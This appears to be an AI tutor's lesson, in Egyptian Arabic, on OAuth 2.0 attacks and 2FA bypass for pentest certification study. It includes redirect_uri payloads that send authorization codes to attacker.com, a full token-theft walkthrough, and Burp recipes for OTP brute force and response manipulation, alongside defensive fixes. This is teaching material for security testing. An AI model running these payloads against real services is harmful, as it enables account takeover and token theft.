# OAuth 2.0 Attacks — من الفكرة للتنفيذ

---

## الصورة الكبيرة — الـ OAuth إيه وليه بنهاجمه؟

الـ **OAuth 2.0** — النطق: **أو-أوث تو-بوينت-زيرو** — هو بروتوكول **التفويض** (Authorization Protocol) — يعني بيسمح لـ application تاني يوصل لبياناتك على موقع ما من غير ما تديه الـ password.

**المثال الأشهر:** لما بتضغط **"Login with Google"** على أي موقع — ده OAuth.

> الفكرة الجوهرية: الـ OAuth بيدي صلاحيات للـ apps من غير ما تشاركهم الـ password — بس لو الـ implementation غلط — الـ attacker يقدر يسرق الـ Authorization Code أو الـ Access Token ويدخل بيه.

---

## مكونات الـ OAuth — لازم تفهمهم عشان تهاجم

|المكون|الدور|مثال|
|---|---|---|
|**Resource Owner** (صاحب البيانات)|إنت|أنطونيوس|
|**Client** (العميل)|الـ App اللي عايز يوصل لبياناتك|موقع Trello|
|**Authorization Server** (سيرفر التصريح)|بيديك الـ Token بعد موافقتك|Google OAuth Server|
|**Resource Server** (سيرفر البيانات)|عنده بياناتك الفعلية|Gmail API|

---

## الـ OAuth Flow — إزاي بيشتغل خطوة بخطوة

```
1. Client بيبعتك للـ Authorization Server:
   GET /authorize?client_id=APP123&redirect_uri=https://trello.com/callback&scope=email

2. إنت بتوافق على الـ app

3. الـ Authorization Server بيبعتك للـ redirect_uri مع Authorization Code:
   https://trello.com/callback?code=AUTH_CODE_XYZ

4. الـ Client بيبعت الـ Authorization Code للـ Authorization Server:
   POST /token
   code=AUTH_CODE_XYZ&client_secret=SECRET

5. الـ Authorization Server بيديه Access Token:
   {"access_token": "TOKEN_ABC", "expires_in": 3600}

6. الـ Client بيستخدم الـ Access Token يوصل لبياناتك:
   GET /userinfo
   Authorization: Bearer TOKEN_ABC
```

---

## أهم الـ OAuth Attacks

---

### الهجوم الأول — Unvalidated Redirect URI (أخطر هجوم في OAuth)

**الـ Redirect URI** — النطق: **ريدايريكت يو-آر-آي** — هو العنوان اللي الـ Authorization Server بيبعت الـ Authorization Code عليه بعد موافقة المستخدم.

**الثغرة:** لو الـ Authorization Server مش بيتحقق من الـ redirect_uri بشكل صارم — الـ attacker يقدر يغيره لـ domain بتاعه.

**الهجوم عملياً:**

الـ request الأصلي:

```
GET /authorize?
  client_id=APP123&
  redirect_uri=https://trello.com/callback&
  scope=email&
  response_type=code
```

الـ attacker بيغير الـ redirect_uri:

```
GET /authorize?
  client_id=APP123&
  redirect_uri=https://attacker.com/steal&
  scope=email&
  response_type=code
```

لو السيرفر قبل → الـ Authorization Code بيتبعت لـ `attacker.com` بدل `trello.com`.

الـ attacker بعدين بيستخدم الـ Code يجيب الـ Access Token ويوصل لبيانات الـ victim!

**إزاي تختبرها في Burp؟**

1. امسك الـ OAuth authorization request في Burp
2. ابعته للـ Repeater
3. غيّر الـ `redirect_uri` بطرق مختلفة:

```
# جرب domain بتاعك
redirect_uri=https://attacker.com/callback

# جرب subdomain
redirect_uri=https://attacker.com.trello.com/callback

# جرب open redirect على نفس الـ domain
redirect_uri=https://trello.com/callback/../../../attacker.com

# جرب URL encoding
redirect_uri=https://trello.com%2Ecallback%40attacker.com
```

لو أي واحدة منهم شتغلت → الـ app vulnerable!

---

### الهجوم التاني — OAuth Token Theft via Referrer Header

**الفكرة:** الـ **Referrer Header** — النطق: **ريفيرر هيدر** — هو header بيتبعت تلقائياً في كل request بيقول جيت من أنهي صفحة.

لو الـ Access Token اتحط في الـ URL — وفي الصفحة دي فيه external links — الـ Token بيتبعت في الـ Referrer Header لأي موقع تاني!

**مثال:**

```
الـ Callback URL:
https://trello.com/callback?access_token=TOKEN_ABC

في الصفحة دي فيه image من موقع تاني:
<img src="https://analytics.com/track.png">

الـ request هيبعت:
GET /track.png HTTP/1.1
Referer: https://trello.com/callback?access_token=TOKEN_ABC
```

الـ analytics server شاف الـ Token!

---

### الهجوم التالت — CSRF على الـ OAuth Flow

**الفكرة:** الـ OAuth بيستخدم `state` parameter عشان يحمي من CSRF — النطق: **ستيت باراميتر**.

الـ `state` هو قيمة عشوائية بتتبعت في الـ authorization request وبترجع في الـ callback — السيرفر بيتحقق إنها نفسها.

**الثغرة:** لو مفيش `state` parameter أو السيرفر مش بيتحقق منه.

**الهجوم:**

1. الـ attacker بيبداء OAuth flow ويوقفه قبل الموافقة
2. بياخد الـ authorization URL اللي فيها الـ code
3. بيخلي الـ victim يفتح الـ URL ده
4. حساب الـ victim بيتربط بحساب الـ attacker!

**إزاي تختبر في Burp؟**

امسك الـ OAuth callback request وشوف:

```
# مفيش state → vulnerable
https://trello.com/callback?code=AUTH_CODE

# فيه state → محتاج تتحقق إنه بيتشيك
https://trello.com/callback?code=AUTH_CODE&state=RANDOM_VALUE
```

جرب تبعت الـ request من غير الـ `state` parameter أو بقيمة غلط — لو السيرفر قبله → vulnerable.

---

### الهجوم الرابع — Stealing Authorization Codes (سرقة الـ Authorization Codes)

**الفكرة:** الـ **Authorization Code** — النطق: **أوثورايزيشن كود** — المفروض يُستخدم مرة واحدة بس ويـ expire بسرعة.

**الثغرة:** لو الـ Code:

- بيستخدم أكتر من مرة — **Replay Attack** — النطق: **ريبلاي أتاك**
- مش بيـ expire — الـ attacker عنده وقت كتير
- قصير وضعيف — ممكن يتـ brute force

**إزاي تختبر؟**

1. امسك الـ Authorization Code من الـ callback URL في Burp
2. استخدمه مرتين
3. لو الثانية اشتغلت → **Replay Attack vulnerability**

```
POST /token
code=AUTH_CODE_XYZ   ← المرة الأولى → نجحت
code=AUTH_CODE_XYZ   ← المرة التانية → لو اشتغلت → ثغرة!
```

---

### الهجوم الخامس — Open Redirect Chain

**الفكرة:** لو الـ app مش بيقبل redirect_uri خارجي بس عنده **Open Redirect** — النطق: **أوبن ريدايريكت** — على domain بتاعه — الـ attacker يقدر يعمل chain.

**مثال:**

```
# الـ app عنده open redirect:
https://trello.com/redirect?url=https://attacker.com

# الـ attacker بيستخدمه كـ redirect_uri:
redirect_uri=https://trello.com/redirect?url=https://attacker.com/steal

# الـ Authorization Server بيشوف إن الـ domain هو trello.com → يقبله
# بس بعدين الـ redirect بيودي الـ code لـ attacker.com
```

---

## الـ OAuth Testing Methodology في Burp

```
الخطوة 1: Map الـ OAuth Flow
    ↓
امسك كل الـ requests من البداية للنهاية في HTTP History
    ↓
الخطوة 2: حدد الـ Parameters المهمة
    ↓
client_id, redirect_uri, state, scope, response_type, code, access_token
    ↓
الخطوة 3: اختبر كل ثغرة
    ↓
Redirect URI manipulation → CSRF (state check) → Code Replay → Token in URL
```

---

## سيناريو كامل — Redirect URI Attack

**الهدف:** `http://target.com` بيستخدم "Login with Google"

**الخطوة 1 — امسك الـ Authorization Request:**

```http
GET /oauth/authorize?
  client_id=TARGET_APP&
  redirect_uri=http://target.com/callback&
  scope=email+profile&
  response_type=code&
  state=abc123
```

**الخطوة 2 — في Burp Repeater غيّر الـ redirect_uri:**

```http
GET /oauth/authorize?
  client_id=TARGET_APP&
  redirect_uri=http://attacker.com/steal&
  scope=email+profile&
  response_type=code&
  state=abc123
```

**الخطوة 3 — لو السيرفر رد بـ redirect لـ attacker.com:**

```http
HTTP/1.1 302 Found
Location: http://attacker.com/steal?code=AUTH_CODE_XYZ
```

**الخطوة 4 — استخدم الـ Code:**

```http
POST /oauth/token
code=AUTH_CODE_XYZ&
client_id=TARGET_APP&
client_secret=SECRET&
grant_type=authorization_code
```

**النتيجة:** جبت الـ Access Token بتاع الـ victim!

---

## الدفاع — إزاي السيرفر يحمي الـ OAuth

|الثغرة|الحل|
|---|---|
|Unvalidated Redirect URI|Whitelist صارمة للـ redirect URIs المسموح بيها|
|مفيش State Parameter|State عشوائي لازم يتشيك في كل callback|
|Authorization Code Reuse|كل code يُستخدم مرة واحدة بس|
|Code مش بيـ expire|Code بيـ expire بعد 60 ثانية|
|Access Token في URL|Access Token في Header بس مش في URL|
|Open Redirect|إزالة أي open redirects من الـ domain|

---

## مصطلحات الدرس

|English Term|المعنى|النطق|
|---|---|---|
|OAuth 2.0|بروتوكول التفويض|أو-أوث تو-بوينت-زيرو|
|Resource Owner|صاحب البيانات|—|
|Client|الـ App اللي عايز الوصول|—|
|Authorization Server|سيرفر منح الصلاحيات|أوثورايزيشن سيرفر|
|Resource Server|سيرفر البيانات الفعلية|—|
|Authorization Code|كود مؤقت لجلب الـ Access Token|أوثورايزيشن كود|
|Access Token|رمز الوصول للبيانات|أكسس توكن|
|Refresh Token|رمز تجديد الـ Access Token|ريفريش توكن|
|Redirect URI|رابط إعادة التوجيه بعد الموافقة|ريدايريكت يو-آر-آي|
|State Parameter|قيمة عشوائية لحماية من CSRF|ستيت باراميتر|
|Scope|نطاق الصلاحيات المطلوبة|سكوب|
|Replay Attack|إعادة استخدام Code أو Token منتهي|ريبلاي أتاك|
|Open Redirect|ثغرة إعادة توجيه مفتوحة|أوبن ريدايريكت|
|Referrer Header|header بيقول جيت من أنهي صفحة|ريفيرر هيدر|
|Whitelist|قائمة بيضاء بالقيم المسموح بيها|وايت-ليست|
|Grant Type|نوع الـ OAuth flow المستخدم|جرانت تايب|

---

## ملخص الفكرة العملية

> الـ OAuth attacks كلها بتدور حول سؤال واحد: **هل الـ Authorization Code أو الـ Access Token ممكن يوصل لحد تاني؟** أخطر هجوم هو الـ **Unvalidated Redirect URI** — بتغير الـ redirect_uri لـ domain بتاعك والـ Code بييجيلك مباشرة. التاني هو غياب الـ State Parameter — بيسمح بـ CSRF على الـ OAuth flow. في Burp — امسك كل الـ OAuth requests وجرب تغيير الـ redirect_uri بطرق مختلفة.

---

# 2FA Bypass — آخر موضوع في المحاضرة

---

## الصورة الكبيرة

الـ **2FA** — اختصار لـ **Two-Factor Authentication** (التحقق بعاملين) — النطق: **تو-فاكتور أوثنتيكيشن** — هو طبقة حماية تانية بعد الـ password.

حتى لو الـ attacker عرف الـ password — محتاج كمان الـ OTP اللي على موبايلك.

> الفكرة الجوهرية: الـ 2FA مش منيع — لو الـ implementation غلط فيه ثغرات ممكن تتجاوزها من غير ما تعرف الـ OTP.

---

## أنواع الـ 2FA وطرق الـ Bypass لكل واحد

### النوع الأول — SMS-based OTP

**إزاي بيشتغل:** بعد الـ password بيتبعتلك كود على موبايلك.

**طرق الـ Bypass:**

**1 — Response Manipulation:** بعض الـ apps بيتحققوا من الـ OTP على الـ client-side بس.

امسك الـ response لما بتبعت OTP غلط في Burp:

```http
HTTP/1.1 200 OK
{"success": false, "message": "Invalid OTP"}
```

غيّر الـ response في Burp:

```http
HTTP/1.1 200 OK
{"success": true, "message": "Login successful"}
```

لو الـ app اتقدم → vulnerable!

**2 — Brute Force على OTP:** لو الـ OTP 4 أرقام → 10,000 احتمال بس. لو الـ OTP 6 أرقام → 1,000,000 احتمال.

لو مفيش Rate Limiting → Burp Intruder يجرب كلهم.

```
Payload: Numbers من 000000 لـ 999999
```

**3 — OTP Reuse (إعادة استخدام OTP):** جرب بعت OTP قديم منتهي — لو السيرفر قبله → vulnerable.

---

### النوع التاني — TOTP (Google Authenticator)

**الـ TOTP** — اختصار لـ **Time-based One-Time Password** — النطق: **تي-أو-تي-بي** — بيولد كود كل 30 ثانية.

**طرق الـ Bypass:**

**1 — Time Window Exploitation:** الـ TOTP بيقبل الكود لفترة بسيطة قبل وبعد الـ 30 ثانية — بعض الـ implementations بيقبلوا الكود لدقيقتين كاملين.

**2 — Backup Codes:** معظم الـ TOTP apps بتديك **Backup Codes** (أكواد احتياطية) — لو المستخدم حاطهم في مكان مش آمن → ممكن تلاقيها.

---

### النوع التالت — Email-based OTP

**طرق الـ Bypass:**

**1 — Response Manipulation** زي SMS.

**2 — Predictable OTP:** لو الـ OTP مش عشوائي — زي إنه بيتولد من الـ timestamp — ممكن تحسبه.

---

## الـ 2FA Bypass Techniques الأكتر شيوعاً

### Bypass 1 — Direct Page Access (تخطي صفحة الـ 2FA خالص)

بعض الـ apps بعد الـ login بيبعتوك لـ `/2fa/verify` — جرب تروح لـ `/dashboard` مباشرة بدون ما تمر على الـ 2FA.

```http
GET /dashboard HTTP/1.1
Cookie: session=VALID_SESSION_AFTER_PASSWORD
```

لو الـ app مش بيتشيك إنك خليصت الـ 2FA → دخلت!

---

### Bypass 2 — Response Manipulation في Burp

**الخطوات:**

1. امسك الـ request بتاع الـ OTP submission في Burp
2. في **Proxy → Options → Match and Replace** — ضيف rule:

```
Match:   {"verified": false}
Replace: {"verified": true}
```

كل response فيه `false` هيتبدل بـ `true` تلقائياً.

---

### Bypass 3 — Brute Force على OTP بـ Burp Intruder

**الخطوات:**

1. امسك الـ OTP request:

```http
POST /2fa/verify HTTP/1.1

otp=123456
```

2. ابعته للـ Intruder — حط الـ position على الـ OTP value
3. **Payload type: Numbers**
4. من `000000` لـ `999999`
5. ابدأ الـ attack وبص على الـ response length

---

### Bypass 4 — SIM Swapping (مبادلة الـ SIM)

**الـ SIM Swapping** — النطق: **سيم سووبينج** — هو هجوم **Social Engineering** — النطق: **سوشيال إنجينيرينج** — بيخلي الـ attacker يقنع شركة الموبايل إنه صاحب الرقم وينقل الرقم لـ SIM جديدة عنده.

النتيجة: كل الـ SMS بتيجي عنده هو.

مش technical attack — بس مهم تعرفه كـ pentester.

---

## الـ 2FA Testing Checklist

```
□ هل تقدر توصل للـ dashboard بدون ما تخلص الـ 2FA؟
□ هل الـ OTP بيـ expire بعد استخدامه؟
□ هل الـ OTP بيـ expire بعد وقت معين؟
□ هل فيه Rate Limiting على محاولات الـ OTP؟
□ هل الـ Response Manipulation بيشتغل؟
□ هل الـ OTP عشوائي كفاية؟
□ هل الـ Backup Codes موجودة وآمنة؟
```

---

## مصطلحات الدرس

|English Term|المعنى|النطق|
|---|---|---|
|2FA|التحقق بعاملين|تو-فاكتور أوثنتيكيشن|
|TOTP|OTP مرتبط بالوقت|تي-أو-تي-بي|
|OTP|كلمة مرور لمرة واحدة|أو-تي-بي|
|Response Manipulation|التلاعب في الـ response|ريسبونس مانيبيوليشن|
|SIM Swapping|مبادلة الـ SIM لسرقة الـ SMS|سيم سووبينج|
|Social Engineering|التلاعب النفسي بالبشر|سوشيال إنجينيرينج|
|Backup Codes|أكواد احتياطية للـ 2FA|باك-آب كودز|
|Time Window|نافذة الوقت اللي الـ OTP صالح فيها|تايم ويندو|
|Brute Force OTP|تجريب كل الأرقام الممكنة للـ OTP|—|
|Direct Page Access|الوصول المباشر للصفحة من غير 2FA|—|
|Match and Replace|استبدال تلقائي في Burp|ماتش أند ريبليس|

---

## ملخص الفكرة العملية

> الـ 2FA مش منيع — أول حاجة جربها دايماً هي **Direct Page Access** — روح للـ dashboard مباشرة من غير ما تخلص الـ 2FA. لو مش شتغلت — جرب **Response Manipulation** في Burp. لو مفيش Rate Limiting — **Brute Force** على الـ OTP بـ Intruder. الـ 2FA الأقوى هو الـ TOTP لأن الكود بيتغير كل 30 ثانية — بس حتى هو عنده ثغرات في الـ implementation.

---

# المحاضرة خلصت كاملة ✅

دلوقتي عندك:

|الموضوع|الحالة|
|---|---|
|Username Enumeration|✅|
|Brute Force|✅|
|CAPTCHA Bypass|✅|
|Parameter Manipulation|✅|
|Session Management + Cookie + CSRF|✅|
|JWT Attacks|✅|
|OAuth Attacks|✅|
|2FA Bypass|✅|

المحاضرة دي كلها هتيجي في الـ eWPTX — خصوصاً JWT وOAuth وSession Management دول الأتقل.

عايز نبداء المحاضرة الجاية ولا في حاجة عايز ترجعلها تاني؟